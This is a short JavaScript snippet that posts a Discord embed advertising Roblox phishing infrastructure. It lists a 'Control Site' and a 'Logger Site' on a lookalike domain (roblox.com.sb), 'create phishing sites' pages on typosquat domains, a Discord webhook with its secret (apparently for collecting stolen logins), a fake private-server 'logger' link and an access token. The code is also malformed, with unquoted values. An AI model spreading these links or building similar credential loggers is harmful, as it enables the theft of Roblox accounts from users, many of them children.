const lib = require('lib')({token: process.env.STDLIB_SECRET_TOKEN});

await lib.discord.channels['@0.3.0'].messages.create({
  "channel_id": ${context.params.event.channel_id},
  "content": Information & Links,
  "tts": true,
  "embeds": [
    {
      "type": "rich",
      "title": Information & Links,
      "description": Links: Site Controller, Logger Site, Create Logger Site & Webhook.,
      "color": 0x5d00ff,
      "fields": [
        {
          "name": Information,
          "value": Token: ETER-F1FMQQFLXUZ8DB4HS1AYOXLNIPTTF0HW,
          "inline": true
        },
        {
          "name": Links,
          "value": Control Site: https://roblox.com.sb/controller/ \n\nLogger Site:https://roblox.com.sb/users/1000850380/profile\n\nCreate sites:\nhttps://roblox.com.sb/creates/phishingsites\nhttps://vwvwvw-roblox.com/creates/phishingsites\n\nWebhook:https://discord.com/api/webhooks/974975126749736980/WARspLBatp-SYtwKn4gDY_77QfefCVPX-45JLu9oKBUDRVox8zGkgHEL7TVk5T49X3v1/ \n\n Vip Server Logger Site:https://roblox.com.sb/games/7194749417/Strawberry-Jam-OPTIONAL-BLOOD?privateServerLinkCode=40316428854432752350355686866592
        }
      ],
      "timestamp": 2022-05-13T14:00:00.000Z,
      "thumbnail": {
        "url": https://th.bing.com/th/id/OIP.Et5EVHm2aKuin3UeGDfxXgHaHa?w=180&h=180&c=7&r=0&o=5&pid=1.7,
        "height": 0,
        "width": 0
      }
    }
  ]
});
